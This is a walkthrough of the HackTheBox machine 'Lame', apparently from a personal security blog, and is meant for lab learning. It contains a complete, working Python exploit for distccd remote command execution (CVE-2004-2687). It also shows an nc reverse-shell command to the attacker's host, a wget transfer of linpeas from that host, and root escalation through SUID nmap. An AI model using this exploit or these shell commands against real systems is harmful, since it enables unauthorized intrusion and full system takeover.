---
layout: page
title: Lame
description: Lame from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/lame/logo.png" title="HTB Lame Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Lame">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we are for a blast from the past.  Looking at Lame from HackTheBox.

As a start, get the open ports by running nmap.

{% raw %}
```sh
└──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 04:52 CST
Nmap scan report for 10.10.10.3
Host is up (0.098s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

<snip>

```
{% endraw %}

<br />
Run nmap again to scan all of the ports to find any hidden services.

{% raw %}
```sh
└──╼ [★]$ sudo nmap -sS -p- -oN nmapfull 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 04:53 CST
Nmap scan report for 10.10.10.3
Host is up (0.098s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 224.07 seconds

```
{% endraw %}

<br />
Google distccd to try and figure our what it is.  I have never seen it before.

{% raw %}
```sh
Distcc is a program designed to distribute compiling tasks across a network to participating hosts.
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/gentoo.png" title="Gentoo Distcc" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://wiki.gentoo.org/wiki/Distcc#:~:text=Distcc%20is%20a%20program%20designed,a%20small%20amount%20of%20setup.">Source</a>

<br />
Google distccd v1 to see if there are any exploits for it.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/googleit.png" title="Google It" class="img-fluid rounded z-depth-1" %}
    </div>
</div>


<br />
Click on the GitHub gist from DarkCoderSc that has an exploit that we can use.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/exploit.png" title="GitHub Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855">Exploit</a>

<br />
Update the exploit to change the strings that the sockets accept to bytes-like object.  Sockets no longer accept strings.

{% raw %}
```sh
'''
	distccd v1 RCE (CVE-2004-2687)
	
	This exploit is an updated version of the python script here:
		https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855

	Socket takes a bytes-like object and not a string.

	Lame Box (HTB):
		local>nc -lvp 1403

		local>./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"	

		Enjoy your shell
'''

import socket
import string
import random
import argparse

'''
	Generate a random alpha num string (Evade some signature base detection?)
'''
def rand_text_alphanumeric(len):
	str = b''
	for i in range(len):
		str += random.choice(string.ascii_letters + string.digits).encode('UTF-8')

	return str

'''
	Read STDERR / STDOUT returned by remote service.
'''
def read_std(s):
	s.recv(4) # Ignore

	len = int(s.recv(8), 16) # Get output length

	if len != 0:
		return s.recv(len)

'''
	Trigger Exploit
'''
def exploit(command, host, port):
    args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]

    payload = "DIST00000001" + "ARGC%.8x" % len(args)
    for arg in args:
        payload += "ARGV%.8x%s" % (len(arg), arg)

    payload = payload.encode('UTF-8')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    socket.setdefaulttimeout(5)
    s.settimeout(5)
    if s.connect_ex((host, port)) == 0:
        print("[\033[32mOK\033[39m] Connected to remote service")
        try:
            s.send(payload)

            dtag = b"DOTI0000000A" + rand_text_alphanumeric(10)

            s.send(dtag)

            s.recv(24)

            print("\n--- BEGIN BUFFER ---\n")

            buff = read_std(s) # STDERR
            if buff:
                print(buff)

            buff = read_std(s) # STDOUT
            if buff:
                print(buff)

            print("\n--- END BUFFER ---\n")

            print("[\033[32mOK\033[39m] Done.")
        except socket.timeout:
            print("[\033[31mKO\033[39m] Socket Timeout")
        except socket.error:
            print("[\033[31mKO\033[39m] Socket Error")
        except Exception as error:
            print("[\033[31mKO\033[39m] Exception Raised", error)
        finally:
            s.close()		
    else:
        print("[\033[31mKO\033[39m] Failed to connect to %s on port %d" % (host, port))


parser = argparse.ArgumentParser(description='DistCC Daemon - Command Execution (Metasploit)')

parser.add_argument('-t', action="store", dest="host", required=True, help="Target IP/HOST")
parser.add_argument('-p', action="store", type=int, dest="port", default=3632, help="DistCCd listening port")
parser.add_argument('-c', action="store", dest="command", default="id", help="Command to run on target system")

try:
	argv = parser.parse_args()

	exploit(argv.command, argv.host, argv.port)
except IOError:
	parse.error

```
{% endraw %}

<br />
Review the NIST entry that discusses this particular vulnerability.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/nist.png" title="NIST" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://nvd.nist.gov/vuln/detail/cve-2004-2687">Vulnerability</a>

<br />
Start a listener listening on 1403.

{% raw %}
```sh
└──╼ [★]$ nc -nlvp 1403
listening on [any] 1403 ...
```
{% endraw %}

<br />
Run the payload.  Execute a reverse shell connecting to the attack machine on the port from the listener sending /bin/sh.

<ul>
<li>-t rhost</li>
<li>-p rport</li>
<li>-c command</li>
</ul>

{% raw %}
```sh
└──╼ [★]$ python ./exploit_upd.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.29 1403 -e /bin/sh"
[OK] Connected to remote service
[KO] Socket Timeout
```
{% endraw %}

<br />
Check the listener and catch the shell.  Upgrade the shell.

{% raw %}
```sh
└──╼ [★]$ nc -nlvp 1403
listening on [any] 1403 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.3] 49941
python -c 'import pty; pty.spawn("/bin/bash");'
daemon@lame:/tmp$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
daemon@lame:/home/makis$ cat user.txt
cat user.txt
<redacted>
daemon@lame:/home/makis$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a6:d6  
          inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:a6d6/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:a6d6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:138167 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1297 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:8488768 (8.0 MB)  TX bytes:152340 (148.7 KB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1284 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1284 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:597781 (583.7 KB)  TX bytes:597781 (583.7 KB)
```
{% endraw %}

<br />
Lookup Linpeas.  Linpeas, if you don't know, is a scripts that will perform a number of checks for privilege escalation and highlight the likely path to privesc.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/linpeas.png" title="linpeas.sh" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250113-4426d62e">Linpeas GitHub</a>

<br />
Download the script to your working folder.  Start a python webserver to serve the script.  Transfer the script to the victim machine.

{% raw %}
```sh
daemon@lame:/dev/shm$ wget 10.10.14.29:8000/linpeas.sh
wget 10.10.14.29:8000/linpeas.sh
--07:27:04--  http://10.10.14.29:8000/linpeas.sh
           => `linpeas.sh'
Connecting to 10.10.14.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830,426 (811K) [text/x-sh]

100%[====================================>] 830,426        1.01M/s             

07:27:05 (1.01 MB/s) - `linpeas.sh' saved [830426/830426]

daemon@lame:/dev/shm$ chmod +x linpeas.sh                                                             
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run the linpeas script.  Notice that nmap has the sticky bit.

{% raw %}
```sh
daemon@lame:/dev/shm$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

-rwsr-xr-x 1 root root 28K Apr  2  2008 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap
-rwsr-xr-x 1 root root 24K Apr  2  2008 /usr/bin/chsh

<snip>
```
{% endraw %}

<br />
Lookup the GTFOBins for nmap to get a sense of how we can abuse it.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/lame/gtfobins.png" title="GTFOBinss" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a>

<br />
Enter nmap interactive mode and use !sh to enter a shell.

{% raw %}
```sh
daemon@lame:/dev/shm$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
sh-3.2# cat /root/root.txt
cat /root/root.txt
<redacted>
sh-3.2# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a6:d6  
          inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:a6d6/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:a6d6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:140134 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2006 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:9497002 (9.0 MB)  TX bytes:351762 (343.5 KB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1685 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1685 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:798921 (780.1 KB)  TX bytes:798921 (780.1 KB)
```
{% endraw %}

<br />
Thank you so much for reading.  Hopefully my post wasn't too lame.